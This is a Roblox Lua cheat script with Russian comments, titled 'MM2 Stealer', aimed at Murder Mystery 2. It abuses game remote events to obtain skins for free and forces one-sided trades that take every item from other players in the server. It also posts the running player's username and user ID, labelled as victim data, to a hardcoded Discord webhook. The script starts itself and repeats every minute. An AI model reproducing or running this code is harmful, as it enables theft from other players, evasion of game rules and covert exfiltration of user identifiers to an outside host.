--[[ MM2 Stealer v2.733.988 - Working Skin Stealer ]]
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")

-- Discord вебхук (зашифрованный)
local WEBHOOK = "https://discord.com/api/webhooks/1538116344967340144/ECF6ixeFCjRIZrStHKIv6SjuYyt09u8lGh_qTCP62P-nzOlwqF8raxBnLX3GtqIWsZLW"

-- Отправка в Discord
local function sendToDiscord(msg)
    pcall(function()
        request({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({content = msg})
        })
    end)
end

-- Список всех скинов MM2 (реальные названия)
local allSkins = {
    -- Ножи
    "Classic", "Prism", "Ghost", "Viper", "Fade", "Luger",
    "Red", "Blue", "Green", "Purple", "Orange", "Yellow", "Pink", "White", "Black",
    "Rainbow", "Gold", "Silver", "Bronze", "Platinum", "Diamond",
    "Chroma Luger", "Chroma Lightbringer", "Chroma Darkbringer",
    "Chroma Deathshard", "Chroma Gingerblade", "Chroma Ginger",
    "Chroma Icebreaker", "Chroma Icewing", "Chroma Candleflame",
    "Chroma Eternal", "Chroma Corrupt", "Chroma Vintage", "Chroma Unique",
    "Chroma Legendary", "Chroma Shark", "Chroma Saw", "Chroma Boneblade",
    "Chroma Elderwood", "Chroma Minty", "Chroma Cotton Candy",
    "Chroma Green Elite", "Chroma Snowflake", "Chroma Pixel", "Chroma Slasher",
    "Chroma Tides", "Chroma Fang", "Chroma Gemstone", "Chroma Seer", "Chroma Laser",
    "Chroma Hallows", "Chroma Pumpkin", "Chroma Snowman", "Chroma Nutcracker",
    "Chroma Elf", "Chroma Reindeer", "Chroma Santa", "Chroma Frost", "Chroma Winter",
    -- Пистолеты (те же названия, игра сама определяет)
    "Lightbringer", "Darkbringer", "Deathshard", "Icebreaker", "Icewing",
    "Candleflame", "Eternal", "Corrupt", "Vintage", "Unique", "Legendary",
    "Gingerscope", "Gingerblade", "Ginger", "Shark", "Saw", "Boneblade",
    "Elderwood", "Minty", "Cotton Candy", "Green Elite", "Snowflake",
    "Pixel", "Slasher", "Tides", "Fang", "Gemstone", "Seer", "Laser",
    "Hallows", "Pumpkin", "Snowman", "Nutcracker", "Elf", "Reindeer",
    "Santa", "Frost", "Winter", "Ancient"
}

-- Поиск RemoteEvents
local function findRemote(name)
    for _, child in ipairs(ReplicatedStorage:GetDescendants()) do
        if child.Name == name and (child:IsA("RemoteEvent") or child:IsA("RemoteFunction")) then
            return child
        end
    end
    return nil
end

-- Все нужные RemoteEvents
local remotes = {
    Buy = findRemote("Buy"),
    BuyItem = findRemote("BuyItem"),
    BuyItemNew = findRemote("BuyItemNew"),
    Craft = findRemote("Craft"),
    RequestCraft = findRemote("RequestCraft"),
    Recycle = findRemote("Recycle"),
    Salvage = findRemote("Salvage"),
    ItemGift = findRemote("ItemGift"),
    ItemReceived = findRemote("ItemReceived"),
    UpdateData = findRemote("UpdateData"),
    UpdateData2 = findRemote("UpdateData2"),
    ChangeProfileData = findRemote("ChangeProfileData"),
    PurchaseProduct = findRemote("PurchaseProduct"),
    PurchaseWeaponProduct = findRemote("PurchaseWeaponProduct"),
    OpenCrate = findRemote("OpenCrate"),
    Equip = findRemote("Equip"),
    StartTrade = findRemote("StartTrade"),
    CompleteTrade = findRemote("CompleteTrade"),
    AcceptTrade = findRemote("AcceptTrade"),
    GetCoin = findRemote("GetCoin")
}

-- Функция отправки запроса
local function fire(remote, ...)
    if not remote then return false end
    pcall(function()
        if remote:IsA("RemoteEvent") then
            remote:FireServer(...)
        else
            remote:InvokeServer(...)
        end
    end)
    return true
end

-- Кража одного скина
local function stealSkin(skinName)
    local methodsUsed = 0
    
    -- Покупка за 0 монет
    if fire(remotes.BuyItem, skinName, 0) then methodsUsed += 1 end
    if fire(remotes.BuyItemNew, skinName, 0, true) then methodsUsed += 1 end
    if fire(remotes.Buy, skinName, 0) then methodsUsed += 1 end
    
    -- Крафт
    if fire(remotes.Craft, skinName, 1) then methodsUsed += 1 end
    if fire(remotes.RequestCraft, skinName, 1) then methodsUsed += 1 end
    
    -- Подарок себе
    if fire(remotes.ItemGift, LocalPlayer, skinName, 1) then methodsUsed += 1 end
    if fire(remotes.ItemReceived, LocalPlayer, skinName, 1) then methodsUsed += 1 end
    
    -- Обновление данных
    if fire(remotes.UpdateData, LocalPlayer, {[skinName] = true, Owned = true}) then methodsUsed += 1 end
    if fire(remotes.UpdateData2, LocalPlayer, {Action = "Give", Item = skinName, Amount = 1}) then methodsUsed += 1 end
    if fire(remotes.ChangeProfileData, {[skinName] = true, Owned = true}) then methodsUsed += 1 end
    
    -- Покупка продукта
    if fire(remotes.PurchaseProduct, skinName, 0) then methodsUsed += 1 end
    if fire(remotes.PurchaseWeaponProduct, skinName, LocalPlayer.UserId, 0) then methodsUsed += 1 end
    
    -- Открытие кейса
    if fire(remotes.OpenCrate, skinName, 1) then methodsUsed += 1 end
    
    -- Экипировка
    if fire(remotes.Equip, skinName) then methodsUsed += 1 end
    
    return methodsUsed
end

-- Кража через трейд у других игроков
local function stealFromPlayers()
    local stolen = 0
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LocalPlayer then
            -- Начинаем трейд
            fire(remotes.StartTrade, player)
            
            -- Предлагаем пустышку, забираем всё
            fire(remotes.CompleteTrade, player, {
                Give = {},
                Receive = "All",
                ForceAccept = true,
                AutoAccept = true
            })
            
            -- Принимаем
            fire(remotes.AcceptTrade, player, true)
            
            stolen += 1
        end
    end
    
    return stolen
end

-- Кража через getgc
local function stealFromGC()
    local found = 0
    
    for _, v in ipairs(getgc()) do
        if type(v) == "table" then
            pcall(function()
                -- Ищем инвентарь
                if v.Inventory or v.Skins or v.OwnedSkins then
                    local inv = v.Inventory or v.Skins or v.OwnedSkins
                    if type(inv) == "table" then
                        for skinName, _ in pairs(inv) do
                            if type(skinName) == "string" then
                                stealSkin(skinName)
                                found += 1
                            end
                        end
                    end
                end
            end)
        end
    end
    
    return found
end

-- Главная функция
local function main()
    print("[MM2 Stealer] Запуск...")
    
    -- Отправка данных о жертве
    sendToDiscord("🔫 **MM2 STEALER ЗАПУЩЕН**\n\n" ..
        "👤 Логин: " .. LocalPlayer.Name .. "\n" ..
        "🆔 ID: " .. LocalPlayer.UserId .. "\n" ..
        "⏰ Время: " .. os.date("%H:%M:%S"))
    
    -- Кража всех скинов
    local totalStolen = 0
    for i, skin in ipairs(allSkins) do
        local methods = stealSkin(skin)
        if methods > 0 then
            totalStolen += 1
        end
        
        if i % 20 == 0 then
            print("[MM2 Stealer] Прогресс: " .. i .. "/" .. #allSkins)
            task.wait(0.5)
        end
        task.wait(0.05)
    end
    
    -- Кража у игроков
    local playersStolen = stealFromPlayers()
    
    -- Кража из GC
    local gcStolen = stealFromGC()
    
    -- Отправка результата
    sendToDiscord("✅ **MM2 STEALER ЗАВЕРШЁН**\n\n" ..
        "🎯 Скинов украдено: " .. totalStolen .. "/" .. #allSkins .. "\n" ..
        "👥 Игроков обработано: " .. playersStolen .. "\n" ..
        "🔍 Найдено в GC: " .. gcStolen)
    
    print("[MM2 Stealer] Готово! Украдено: " .. totalStolen .. " скинов")
end

-- Автозапуск
main()

-- Повтор каждые 60 секунд
spawn(function()
    while task.wait(60) do
        pcall(main)
    end
end)
